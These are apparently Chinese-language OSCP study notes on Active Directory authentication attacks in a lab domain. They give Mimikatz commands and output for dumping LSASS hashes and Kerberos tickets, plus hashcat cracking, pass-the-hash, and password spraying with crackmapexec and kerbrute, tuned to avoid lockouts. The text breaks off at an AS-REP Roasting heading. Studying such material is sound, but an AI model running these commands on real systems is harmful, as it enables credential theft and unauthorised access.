
# Attacking Active Directory Authentication
首先探索 Active Directory (AD) 的身份驗證機制，了解 Windows caches authentication objects（例如密碼 hashes 和 tickets）的位置。接下來針對這些身分驗證機制的攻擊方法，來取得使用者憑證以及對系統和服務的存取權限。
## Understanding Active Directory Authentication
AD Authentication 包含：
- Understand NTLM Authentication
- Understand Kerberos Authentication
- Become familiar with cached AD Credentials

### NTLM Authentication
在 [Password Attacks](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#ntlm-vs-net-ntlmv2) 中討論了什麼是 NTLM 以及在哪裡可以找到它的 Hash。在本節中，將在 Active Directory 環境中探討 NTLM 驗證。
>[!Note]
>NTLM 主要在無法使用 Kerberos 時才會被用來身份驗證，例如：
>- 透過 IP 連線伺服器。
>- 伺服器 未註冊在 AD DNS。
>- 某些第三方應用仍然使用 NTLM。

####  NTLM 驗證流程（7 個步驟）
![image](https://hackmd.io/_uploads/H19MNKao1x.png)
1. 計算 NTLM Hash
使用者輸入密碼後，電腦會將其轉換為 NTLM Hash。
2. 用戶端傳送使用者名稱至伺服器
伺服器不會收到密碼本身，而是先收到 Username。
3. 伺服器產生隨機數（nonce/challenge）並回傳
伺服器生成一個隨機挑戰值（nonce），並回傳給用戶端。
4. 用戶端使用 NTLM Hash 加密 nonce 並傳送回伺服器
這個 加密後的 nonce（稱為 response） 會被送回伺服器。
5. 伺服器將 response、nonce 及 Username 傳送至 Domain Controller
DC（Domain Controller）負責進一步驗證。
6. DC 使用 NTLM Hash 加密 nonce 並比對 response
DC 內建用戶 NTLM Hash，會使用該 Hash 加密 nonce，並與伺服器的 response 進行比對。
7. 如果比對成功，則通過身份驗證
如果兩者相符，驗證成功；否則，拒絕登入。

>[!Tip]
>NTLM 的安全性問題:
>- 無法反向破解：
>NTLM 是一種 `單向 Hash 算法`，無法直接從雜湊值逆推出原始密碼。
>- 計算速度快，容易被破解：
NTLM 缺乏 Salt，使其雜湊值對於相同的密碼來說都是固定的，暴力破解更容易。
>>使用 Hashcat + 高效能 GPU，可以每秒測試 6000 億個 NTLM Hash\
8 字元的密碼在 2.5 小時內破解\
9 字元的密碼在 11 天內破解

### Kerberos Authentication
Kerberos 是一種 基於 Ticket 的認證協議，從 Windows Server 2003 開始採用為 Windows 的主要身份驗證機制\
與 NTLM 直接與伺服器互動不同，Kerberos 的認證流程 需要透過 Domain Controller 作為 金鑰發放中心（[Key Distribution Center](https://en.wikipedia.org/wiki/Key_distribution_center), KDC） 來管理身份驗證。
#### Kerberos 認證流程
Kerberos 的認證包含 三個主要階段，涉及 四個請求回應（`AS-REQ` / `AS-REP` / `TGS-REQ` / `TGS-REP`）和最終的 應用程式請求（`AP-REQ`）。
![image](https://hackmd.io/_uploads/rkOIaYajkx.png)

##### 第一階段：身份驗證請求（AS-REQ / AS-REP）
1. 用戶登入後，發送 AS-REQ（Authentication Server Request）
當用戶在 workstation 上輸入密碼，系統會計算密碼的 `NTLM Hash` 並使用這個 Hash 加密一個 `timestamp`。這個請求會發送到 DC，並由 KDC 的驗證伺服器（AS, Authentication Server）處理。

2. KDC 驗證用戶並回應 AS-REP（Authentication Server Reply）
DC 會從 [ntds.dit](https://attack.mitre.org/techniques/T1003/003/) 文件中檢索用戶的 NTLM Hash，並嘗試解密 timestamp。\
如果解密成功，並且 timestamp 不是重複的（避免 potential replay attack），則身份驗證成功。\
DC 會返回 一張「`Ticket Granting Ticket` (TGT)」和「`Session Key`」 給用戶：
>`TGT` 是用 [KRBTGT](https://adsecurity.org/?p=483) 帳戶的 NTLM Hash 加密的，因此只有 DC 能夠解密。\
>`Session Key` 用戶可以使用，並在後續步驟中使用 TGT 來請求服務存取。
>>TGT 預設有效期為 10 小時，之後可自動續約，不需要重新輸入密碼。

##### 第二階段：獲取服務存取權（TGS-REQ / TGS-REP）
3. 用戶發送 TGS-REQ（Ticket Granting Service Request）
當用戶要存取特定的 AD 服務（例如 network share 或 mailbox），它會：\
使用 Session Key 加密 `TGT` 和 `timestamp`，並請求特定服務的存取權。
4. KDC 回應 TGS-REP（Ticket Granting Service Reply）
DC 會解密 TGT 來驗證身份，並檢查請求的資源是否存在。\
如果成功，DC 會提供一張 `Service Ticket`：
包含 username、group memberships 資格和新的 Session Key。
> Service Ticket 是用該服務的帳戶密碼 Hash 加密的，因此只有該服務能夠解密。

##### 第三階段：服務驗證（AP-REQ）
5. 用戶發送 AP-REQ（Application Request）給應用伺服器
用戶向 Application server（如 file share、SQL Server）提交請求，包含：\
(1)Session Key 加密的 `username` 和 `timestamp`\
(2)加密的 `Service Ticket`。
6. 應用伺服器驗證請求
伺服器 使用自己的 NTLM Hash 解密 Service Ticket，獲取用戶資訊與 Session Key。\
比對 AP-REQ 的 `username` 與 `Service Ticket 中的 username`。
如果匹配，則授權用戶存取該應用程式或資源。

#### NTLM vs. Kerberos 認證比較
- | NTLM | Kerberos |
:------:|:---------------------|:---------------------|
身份驗證方式| Challenge-Response | Ticket-based
密碼傳輸 | 直接使用 NTLM Hash | 使用 TGT 和 Service Ticket
安全性 | 脆弱，易受 Hash 攻擊 | 更安全，避免密碼傳輸
適用場景 | 單獨伺服器或無法使用 Kerberos 的情況| AD 環境，預設身份驗證方式

### Cached AD Credentials
AD 的 Cached Credentials，並利用 Mimikatz 提取 Windows 記憶體中的密碼 Hash 與 Kerberos Ticket，進而進行攻擊或 Lateral Movement\
####  AD 快取密碼
在 Windows 網域環境 中，Kerberos 認證機制透過 Single Sign-On (SSO) 讓 user 不需要反覆輸入密碼。然而為了讓 TGT（Ticket Granting Ticket） 可以在有效期內自動續約，Windows 需要 快取使用者的密碼雜湊，而這些資訊會儲存在 LSASS（[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)）process 的記憶體內。

如果能夠 存取 LSASS 記憶體，就可以取得 `NTLM Hash` 或 `Kerberos Ticket` 來執行進一步的攻擊。

#### 1. Mimikatz 提取密碼雜湊
##### 1.1 RDP 連線並啟用 Mimikatz
jeff domain user 是 CLIENT75 的 local administrator，所以可以在本機提權
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.208.75
```
(Powershell): Run as Administrator
```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK
```
> 啟用 SeDebugPrivilege 權限，讓 Mimikatz 具備存取 LSASS 記憶體 的權限。

##### 1.2 提取所有已登入使用者的密碼雜湊
```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 12:32:11 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
        tspkg :
        wdigest :
         * Username : jeff
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
Authentication Id : 0 ; 122474 (00000000:0001de6a)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 1:32:23 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
```
> jeff:
> - NTLM Hash = `2688c6d2af5e9c7ddb268899123744ea`
> - SHA1 Hash = `f57d987a25f39a2887d158e8d5ac41bc8971352f`
>
> dave:
> - NTLM Hash = `08d7a47a6f9f66b97b1bae4178747494`
> - SHA1 Hash = `a0c2285bfad20cc614e2d361d6246579843557cd`

>[!Tip]
>對於 Windows 2003 的 AD instances，NTLM 是唯一可用的雜湊演算法。🥚 對於執行 Windows Server 2008 或更高版本的實例，`NTLM` 和 `SHA-1` 可能都可用。\
>在 Windows 7 等較舊的作業系統或手動設定的作業系統上，`WDigest 11`會處於啟用狀態。啟用 WDigest 時，執行 Mimikatz 會顯示明文密碼以及密碼雜湊值。

#### - 利用 NTLM Hash
可參考 Password Attacks 章節
- Offline Cracking
```
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 1000 jeff.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
- pass-the-hash (PtH)
```
mimikatz # sekurlsa::pth /user:jeff /domain:corp.com /ntlm:2688c6d2af5e9c7ddb268899123744ea /run:powershell.exe
```

#### 2. Mimikatz 提取 Kerberos Ticket
##### 2.1 訪問共享資料夾，觸發 Kerberos Ticket 存儲
WEB04 上 UNC 路徑為\\web04.corp.com\backup 的SMB 共享的內容
```
PS C:\Users\jeff> dir \\web04.corp.com\backup


    Directory: \\web04.corp.com\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```
> 讓系統產生一個 TGS（Service Ticket），並快取於 LSASS
##### 2.2 用 Mimikatz 提取 Kerberos Ticket
使用 Mimikatz 透過 `sekurlsa::tickets` 顯示儲存在記憶體中的 Ticket
```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```
> 表示 jeff 在 web04.corp.com 伺服器上有一張存取權限的 Kerberos 票據。\
透過這張 ticket ，攻擊者可以 冒充 jeff，進行 SMB 存取或其他操作(如 Pass-The-Ticket)

>[!Important]
**如何利用 ticket 進行攻擊**
>1. 竊取 TGS：
>- 只允許存取特定的服務。
>- Pass-the-Ticket（PTT）攻擊：直接使用竊取的 TGS 來存取受保護資源。
>2. 竊取 TGT：
>- 允許攻擊者偽裝成目標使用者，請求新的 TGS 來存取 任意資源。
>- Golden Ticket 攻擊：偽造 TGT 來完全掌控 AD 網域。
>3. Mimikatz 票據提取與注入：
>- Export：將 TGT/TGS ticket 存儲到硬碟。
>- Inject：將 TGT/TGS 重新導入 LSASS 記憶體，從而在目標機器上模擬受害者身份。

## Performing Attacks on Active Directory Authentication
介紹針對 Active Directory（AD）身份驗證 的各種攻擊方法
### Password Attacks (Password Spraying)
在 AD 環境中，過於頻繁的密碼錯誤輸入可能會導致帳戶鎖定，引起系統管理員的警覺。因此，需要使用密碼噴灑攻擊來測試大量帳戶，使用少量常見密碼來嘗試登入，而不是對單一帳戶進行暴力破解。\
可以從 `net accounts` 取得的資訊:
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.151.75
```
```
PS C:\Windows\system32> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```
> `Lockout threshold`：連續 5 次錯誤輸入密碼，會導致帳戶鎖定\
`Lockout duration`：30 分鐘後解除鎖定\
`Lockout observation window`：30 分鐘內錯誤超過 5 次才會觸發鎖定\
>>表示可以每 30 分鐘內嘗試 4 次錯誤密碼輸入\
>>可以在 24 小時內對每個網域使用者嘗試 192 次登錄

#### 1. 使用 LDAP 和 ADSI（低速、隱蔽）
透過 LDAP 協議與 ADSI（Active Directory Service Interfaces） 進行身份驗證。低速但較隱蔽，不會產生大量網路流量。\
在 [Active Directory - Manual Enumeration](#Adding-Search-Functionality-to-our-Script) 章節中，使用 DirectoryEntry 對 Domain controller 進行查詢\
透過 DirectoryEntry  Object 來測試帳戶密碼是否正確：
```
PS C:\Windows\system32> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
PS C:\Windows\system32> $PDC = ($domainObj.PdcRoleOwner).Name
PS C:\Windows\system32> $SearchString = "LDAP://"
PS C:\Windows\system32> $SearchString += $PDC + "/"
PS C:\Windows\system32> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
PS C:\Windows\system32> $SearchString += $DistinguishedName
PS C:\Windows\system32> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")

distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```
>`GetCurrentDomain()`：取得當前 Windows 設備所屬的 AD 網域資訊\
>`PdcRoleOwner`：取得 Primary Domain Controller (PDC) 的名稱\
>`LDAP://$PDC/DC=corp,DC=com`: 組合 LDAP 路徑\
>創建 System.DirectoryServices.DirectoryEntry：\
`$SearchString`：LDAP 路徑，指定要查詢的 AD 網域。
"pete"：測試登入的 AD 使用者名稱。
"Nexus123!"：測試用的密碼。
>> object 建立，代表密碼正確

若密碼不正確，會顯示 password incorrect\
![image](https://hackmd.io/_uploads/SyaC9yAo1g.png)

#### 撰寫腳本
可以使用現成的 [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
```
PS C:\Tools> powershell -ep bypass
PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```
> 提供了兩組有效的憑證，密碼為 `Nexus123！`

#### 2. 使用 SMB（傳統方法、較為顯眼）
透過 SMB（Server Message Block）協議驗證帳戶，每次嘗試都會建立完整的 SMB 連線，因此網路流量較大。\
使用 [crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec) 工具（Kali Linux）：
```
┌──(chw㉿CHW)-[~]
└─$ cat users.txt                                       
dave
jen
pete

┌──(chw㉿CHW)-[~]
└─$ crackmapexec smb 192.168.151.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.151.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.151.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.151.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
SMB         192.168.151.75  445    CLIENT75         [-] corp.com\pete:Nexus123! STATUS_ACCOUNT_LOCKED_OUT 

```
> `-d corp.com`: 設定目標 AD Domain\
`--continue-on-success`: 讓工具在找到有效帳戶後繼續測試

crackmapexec 在開始 password spraying 之前不會檢查網域的密碼策略。因此，我們應該謹慎使用這種方法鎖定使用者帳戶

假設 dave 是 CLIENT75 上的本機管理員。讓我們使用 crackmapexec 和密碼 Flowers1 來瞄準這台機器
```
┌──(chw㉿CHW)-[~]
└─$ crackmapexec smb 192.168.151.75 -u dave -p 'Flowers1' -d corp.com
SMB         192.168.151.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.151.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
```
> `Pwn3d!` 表示擁有本機管理員權限

#### 3. 使用 Kerberos（最快速、低噪音）
基於取得 TGT。
Kerberos 驗證只需要發送 兩個 UDP frames（AS-REQ），比起 LDAP 和 SMB 方法更快、更安靜。\
使用 [kerbrute](https://github.com/ropnop/kerbrute) 工具（Windows 版）：
```
PS C:\Tools> type .\users.txt
pete
dave
jen

PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\users.txt "Nexus123!"

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/11/25 - Ronnie Flathers @ropnop

2025/03/11 10:41:59 >  Using KDC(s):
2025/03/11 10:41:59 >   dc1.corp.com:88
2025/03/11 10:41:59 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2025/03/11 10:41:59 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2025/03/11 10:41:59 >  Done! Tested 3 logins (2 successes) in 0.053 seconds
```

>[!Note]
>Q: Spray the credentials of pete against all domain joined machines with crackmapexec. On which machine is pete a local administrator?\
>Ans:
>```
>┌──(chw㉿CHW)-[~]
>└─$ crackmapexec smb 192.168.151.0/24 -u pete -p 'Nexus123!' -d corp.com
>SMB         192.168.151.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.76  445    CLIENT76         [*] Windows 10 / Server 2016 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.151.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
>SMB         192.168.151.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
>SMB         192.168.151.72  445    WEB04            [+] corp.com\pete:Nexus123! 
>SMB         192.168.151.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 
>SMB         192.168.151.73  445    FILES04          [+] corp.com\pete:Nexus123! 
>SMB         192.168.151.76  445    CLIENT76         [+] corp.com\pete:Nexus123! (Pwn3d!)
>SMB         192.168.151.70  445    DC1              [+] corp.com\pete:Nexus123!
>```

### AS-REP Roasting
